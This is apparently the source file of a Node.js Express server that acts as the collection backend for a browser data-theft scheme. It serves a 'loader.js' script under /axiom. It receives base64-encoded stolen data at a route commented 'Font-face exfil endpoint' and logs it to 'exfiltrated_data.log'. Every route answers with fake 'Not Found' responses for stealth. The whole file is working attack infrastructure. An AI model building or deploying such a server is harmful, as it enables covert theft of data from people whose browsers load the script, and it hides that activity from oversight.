const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;

// Lightweight ping route (for UptimeRobot or similar to keep service awake)
app.get('/ping', (req, res) => {
  res.status(200).send('pong');
});

// Serve loader.js at /axiom/loader.js
app.use('/axiom', express.static(path.join(__dirname, 'public/axiom')));

// Stealth: root shows nothing
app.get('/', (req, res) => {
  res.status(404).send('Not Found');
});

// Direct /i shows original-style 404
app.get('/i', (req, res) => {
  res.status(404).json({ detail: "Not Found" });
});

// Font-face exfil endpoint
app.get('/i/:data', (req, res) => {
  const encoded = req.params.data;
  let payload = {};

  try {
    const jsonString = Buffer.from(encoded, 'base64').toString('utf-8');
    payload = JSON.parse(jsonString);

    console.log('✅ DATA RECEIVED:', JSON.stringify(payload, null, 2));

    fs.appendFileSync(
      path.join(__dirname, 'exfiltrated_data.log'),
      JSON.stringify(payload, null, 2) + '\n---\n'
    );
  } catch (e) {
    console.error('Decode error:', e.message);
  }

  res.status(404).json({ detail: "Not Found" });
});

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`Loader: https://YOUR-BACKEND.onrender.com/axiom/loader.js`);
  console.log(`Ping:   https://YOUR-BACKEND.onrender.com/ping`);
});